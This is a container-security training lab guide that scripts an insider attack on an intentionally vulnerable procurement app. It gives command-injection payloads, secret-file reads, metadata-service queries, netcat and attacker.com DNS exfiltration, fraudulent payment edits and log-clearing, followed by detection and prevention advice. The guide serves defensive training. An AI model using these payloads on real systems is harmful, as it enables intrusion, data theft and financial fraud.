# VendorQuote Attack Lab Guide

**A CrowdStrike Container Security Training Exercise**

---

## 🎯 Lab Scenario

### The Application: VendorQuote

VendorQuote is an internal procurement pricing and quote approval system used by the finance team. It's a containerized Node.js web application that manages vendor quotes, discount exceptions, and pricing data.

**Key Features:**
- Dashboard with procurement metrics
- Vendor pricing table with sensitive financial data
- Discount approval workflow
- Support diagnostic tools for troubleshooting

**Critical Data at Risk:**
- Payment card data (PCI DSS scope)
- Vendor pricing and contracts
- Internal API credentials
- Cloud service account keys

---

## 📖 Attack Narrative: The Disgruntled Contractor

### Background Story

**Meet John Doe** - a procurement contractor (username: `contractor-jdoe`) who has legitimate access to VendorQuote for processing vendor quotes. After being notified that his contract won't be renewed, John decides to take action before his access is revoked.

**John's Motivation:**
- Revenge against the company
- Financial gain by manipulating pricing
- Exfiltrating sensitive data to sell to competitors

**What John Knows:**
- He has valid credentials to the VendorQuote web portal
- The system runs in a container on AWS EC2
- There's a diagnostic tool in the support section
- The application contains sensitive financial and PCI data

---

## 🛠️ Lab Setup

### Prerequisites

**Attack Platforms (Choose One or Both):**

**Option 1: Windows Host (Insider Threat Perspective)**
- Web browser (Chrome, Firefox, or Edge)
- Network access to VendorQuote application
- Role: Disgruntled contractor with legitimate credentials

**Option 2: Kali Linux Host (External Attacker Perspective)**
- Kali Linux with Metasploit installed
- Network access to target container
- Tools: `curl`, `nmap`, Metasploit Framework
- Role: Attacker who compromised contractor credentials

**Target Environment:**
- VendorQuote container running on port 80/443
- Target IP: [YOUR_EC2_INSTANCE_IP]
- Application URL: `http://[TARGET_IP]`

---

## Phase 1: Reconnaissance & Discovery

### 1.1 Initial Enumeration (Both Platforms)

**From Windows Browser:**

1. Navigate to the VendorQuote application:
   ```
   http://[TARGET_IP]
   ```

2. Explore the application interface:
   - Dashboard: Overview of procurement metrics
   - Quotes: Vendor pricing data
   - Approvals: Discount exception requests
   - Support: Diagnostic tools (⚠️ interesting!)

3. Take note of:
   - Current user context: `contractor-jdoe`
   - Available functionality
   - Data visible to your role

**From Kali Linux:**

1. Port scanning:
   ```bash
   nmap -sV -p- [TARGET_IP]
   ```

2. Web reconnaissance:
   ```bash
   curl -I http://[TARGET_IP]
   ```

3. Directory enumeration:
   ```bash
   # Check for common paths
   curl http://[TARGET_IP]/api/
   curl http://[TARGET_IP]/healthz
   curl http://[TARGET_IP]/api/support/diag
   ```

4. Identify the web stack:
   ```bash
   curl -v http://[TARGET_IP] 2>&1 | grep -i server
   ```

### 1.2 Application Mapping

Document the application endpoints:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/` | GET | Dashboard |
| `/quotes` | GET | Vendor pricing data |
| `/approvals` | GET | Discount approvals |
| `/support` | GET | Diagnostic tools |
| `/api/support/diag` | POST | Execute diagnostics (⚠️) |
| `/healthz` | GET | Health check |

**Key Finding:** The `/api/support/diag` endpoint accepts POST requests with diagnostic commands.

---

## Phase 2: Initial Access & Exploitation

### 2.1 Testing the Diagnostic Tool (Windows Browser)

1. Navigate to: `http://[TARGET_IP]/support`

2. Observe the "Support Diagnostic Tools" interface with a text area

3. Try a benign command first:
   ```
   hostname
   ```

4. Click "Run Diagnostic" and observe the output

**Expected Result:** You see the container's hostname displayed!

5. Test user context:
   ```
   whoami
   ```

**Expected Result:** Shows `root` - the container is running as root!

6. List environment variables (searching for secrets):
   ```
   env
   ```

**Expected Result:** Exposed environment variables including potential API keys

### 2.2 Remote Code Execution via API (Kali Linux)

From Kali, exploit the vulnerable diagnostic endpoint directly:

1. **Basic RCE Test:**
   ```bash
   curl -X POST http://[TARGET_IP]/api/support/diag \
     -H 'Content-Type: application/json' \
     -d '{"note":"whoami"}'
   ```

2. **System Information Gathering:**
   ```bash
   # Get OS information
   curl -X POST http://[TARGET_IP]/api/support/diag \
     -H 'Content-Type: application/json' \
     -d '{"note":"cat /etc/os-release"}'
   ```

3. **List running processes:**
   ```bash
   curl -X POST http://[TARGET_IP]/api/support/diag \
     -H 'Content-Type: application/json' \
     -d '{"note":"ps aux"}'
   ```

4. **Check for network connections:**
   ```bash
   curl -X POST http://[TARGET_IP]/api/support/diag \
     -H 'Content-Type: application/json' \
     -d '{"note":"netstat -tunlp"}'
   ```

---

## Phase 3: Privilege & Data Discovery

### 3.1 Exploring the Container File System

**From Windows Browser (Support Page):**

1. List application directory:
   ```
   ls -la /app
   ```

2. Find sensitive configuration files:
   ```
   find /app -type f -name "*.json" -o -name "*.env" -o -name "*.pem"
   ```

**From Kali Linux:**

```bash
# List application files
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"ls -la /app"}'

# Find all sensitive files
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"find /app -type f \\( -name *.json -o -name *.env -o -name *.pem \\)"}'
```

### 3.2 Discovering Embedded Secrets

**Critical Files to Examine:**

1. **Environment Configuration:**
   ```bash
   cat /app/config/.env
   ```

2. **Cloud Service Account Keys:**
   ```bash
   cat /app/config/gcp-service-account.json
   ```

3. **API Keys and Tokens:**
   ```bash
   cat /app/config/slack.json
   ```

4. **Private Keys:**
   ```bash
   cat /app/keys/vendorquote-internal.pem
   ```

5. **Backup Files (Often Contain Passwords):**
   ```bash
   cat /app/backup/vendorquote-backup.sql
   ```

**Example using Kali:**

```bash
# Extract the .env file with secrets
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env"}' | jq -r '.output'
```

### 3.3 Finding PCI Data

**Sensitive Data Files:**

1. **Vendor Pricing (Contains Payment Data):**
   ```bash
   cat /app/data/vendor_pricing_2026.csv
   ```

2. **Discount Exceptions (Business Logic Abuse):**
   ```bash
   cat /app/data/discount_exceptions.csv
   ```

3. **Procurement Notes (Unstructured Sensitive Data):**
   ```bash
   cat /app/data/procurement_notes.txt
   ```

**From Windows Browser:**
```
cat /app/data/vendor_pricing_2026.csv
```

---

## Phase 4: Persistence & Privilege Escalation

### 4.1 Understanding Container Privileges

Check container capabilities and security context:

```bash
# Check if we're running as root
id

# Check container capabilities
capsh --print

# Check if we can access the Docker socket
ls -la /var/run/docker.sock

# Check mounted volumes
mount | grep -i docker
```

### 4.2 Attempt Container Escape (Advanced)

**Warning:** This section demonstrates why containers must run as non-root users.

1. **Check for privileged mode:**
   ```bash
   fdisk -l
   ```

2. **Look for host file system access:**
   ```bash
   ls -la /host
   ```

3. **Check for Kubernetes service account:**
   ```bash
   ls -la /var/run/secrets/kubernetes.io/
   ```

---

## Phase 5: Lateral Movement & Data Exfiltration

### 5.1 Network Reconnaissance from Container

**From Kali:**

```bash
# Check network configuration
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"ip addr show"}'

# Scan internal network (if possible)
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"ping -c 1 169.254.169.254"}' # AWS metadata service
```

### 5.2 Accessing AWS Metadata Service

If the container has access to AWS EC2 metadata:

```bash
# Get IAM role credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Via the vulnerable diagnostic endpoint:**

```bash
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"curl http://169.254.169.254/latest/meta-data/"}'
```

### 5.3 Data Exfiltration

**Method 1: Direct Download via Browser (Windows)**

1. In the Support diagnostic tool, encode sensitive data:
   ```
   base64 /app/config/gcp-service-account.json
   ```

2. Copy the base64 output and decode locally:
   ```powershell
   # On your Windows machine
   echo "BASE64_STRING_HERE" | base64 -d > stolen-keys.json
   ```

**Method 2: Exfiltrate via HTTP (Kali)**

1. Set up a listener on your Kali machine:
   ```bash
   nc -lvnp 4444 > exfiltrated-data.txt
   ```

2. Send data from container:
   ```bash
   curl -X POST http://[TARGET_IP]/api/support/diag \
     -H 'Content-Type: application/json' \
     -d '{"note":"cat /app/config/.env | nc [YOUR_KALI_IP] 4444"}'
   ```

**Method 3: DNS Exfiltration (Stealth)**

```bash
# Exfiltrate data via DNS queries (bypasses many firewalls)
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"cat /app/config/.env | base64 | xargs -I {} nslookup {}.attacker.com"}'
```

---

## Phase 6: Malicious Modification

### 6.1 Objective: Manipulate Pricing Data

**Scenario:** John wants to approve his own fraudulent discount exception.

**From Windows Browser:**

1. View current pricing data:
   ```
   cat /app/data/discount_exceptions.csv
   ```

2. Backup the original file:
   ```
   cp /app/data/discount_exceptions.csv /tmp/backup.csv
   ```

3. Modify the file to approve discounts:
   ```
   echo "2026-12-31,ACME Corp,Special Contract,75%,APPROVED,contractor-jdoe" >> /app/data/discount_exceptions.csv
   ```

4. Verify the change:
   ```
   tail /app/data/discount_exceptions.csv
   ```

**From Kali Linux:**

```bash
# Append fraudulent approval
curl -X POST http://[TARGET_IP]/api/support/diag \
  -H 'Content-Type: application/json' \
  -d '{"note":"echo \"2026-12-31,ACME Corp,Fraudulent,75%,APPROVED,contractor-jdoe\" >> /app/data/discount_exceptions.csv"}'
```

### 6.2 Objective: Steal and Modify PCI Data

**Scenario:** Modify vendor payment details to redirect payments.

1. **Extract credit card data:**
   ```bash
   cat /app/data/vendor_pricing_2026.csv | grep -i "credit\|card\|payment"
   ```

2. **Modify payment routing:**
   ```bash
   sed -i 's/ORIGINAL_ACCOUNT/ATTACKER_ACCOUNT/g' /app/data/vendor_pricing_2026.csv
   ```

3. **Verify changes:**
   ```bash
   grep "ATTACKER_ACCOUNT" /app/data/vendor_pricing_2026.csv
   ```

---

## Phase 7: Covering Tracks

### 7.1 Log Manipulation

**Clear command history:**

```bash
# View logs
cat /var/log/*.log

# Clear shell history (if bash history exists)
history -c
unset HISTFILE
```

### 7.2 Timestamp Manipulation

```bash
# Change file modification times to hide evidence
touch -t 202601010000 /app/data/discount_exceptions.csv
```

---

## 🛡️ Detection Opportunities

### Where CrowdStrike Falcon Would Alert

**1. Container Image Assessment:**
- Detects image running as root (UID 0)
- Identifies embedded secrets in image layers
- Flags use of privileged ports (port 80)
- Detects ADD instruction instead of COPY

**2. Runtime Detection:**
- Suspicious commands executed in container (`whoami`, `env`, `find`)
- Base64 encoding of sensitive files
- Network connections to unusual destinations
- File modifications in `/app/data/`
- Access to AWS metadata service (169.254.169.254)

**3. Behavioral Analytics:**
- Unusual container lifetime (long-running exec sessions)
- High volume of API calls to diagnostic endpoint
- Data exfiltration patterns (large outbound transfers)
- Privilege escalation attempts

**4. Cloud Workload Protection:**
- IAM role credential access from container
- Lateral movement attempts within VPC
- DNS exfiltration patterns

---

## 🎓 Key Learning Points

### Why This Attack Succeeded

1. **Root User Execution** - Container runs as UID 0
2. **Command Injection Vulnerability** - Unsanitized input passed to shell
3. **Embedded Secrets** - Credentials in image layers
4. **Excessive Permissions** - Container has more access than needed
5. **No Runtime Monitoring** - Malicious commands go undetected
6. **Weak Input Validation** - Diagnostic tool accepts arbitrary commands

### How to Prevent These Attacks

1. **Never run containers as root** - Use USER instruction in Dockerfile
2. **Scan images before deployment** - CrowdStrike Image Assessment
3. **Remove secrets from images** - Use secrets management solutions
4. **Implement runtime security** - CrowdStrike Falcon Container Sensor
5. **Apply least privilege** - Restrict container capabilities
6. **Network segmentation** - Block access to metadata services
7. **Input validation** - Never pass user input directly to shell commands

---

## 📝 Lab Completion Checklist

- [ ] Successfully accessed the web application
- [ ] Executed commands via the diagnostic tool
- [ ] Retrieved environment variables with secrets
- [ ] Extracted sensitive files (keys, configs)
- [ ] Located PCI data in CSV files
- [ ] Modified discount exception data
- [ ] Exfiltrated data using base64 encoding
- [ ] Tested AWS metadata service access
- [ ] Documented security findings
- [ ] Understood detection opportunities with Falcon

---

## 🚀 Advanced Challenges

For experienced participants:

1. **Reverse Shell:** Establish a persistent reverse shell connection
2. **Metasploit Module:** Create a custom Metasploit module for the RCE
3. **Container Escape:** Research and attempt container escape techniques
4. **Kubernetes Pivot:** If running in K8s, attempt to access cluster credentials
5. **Cloud API Abuse:** Use stolen AWS credentials to access S3 buckets

---

## 📚 Additional Resources

- [CrowdStrike Falcon Cloud Security](https://www.crowdstrike.com/products/cloud-security/)
- [Container Security Best Practices](https://www.crowdstrike.com/cybersecurity-101/cloud-security/container-security/)
- [OWASP Docker Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)

---

**⚠️ Important Disclaimer**

This lab contains intentionally vulnerable code for educational purposes only. Never deploy this application in a production environment or on public networks. All attacks must be performed only in authorized training environments.

**© 2026 CrowdStrike Training Lab**
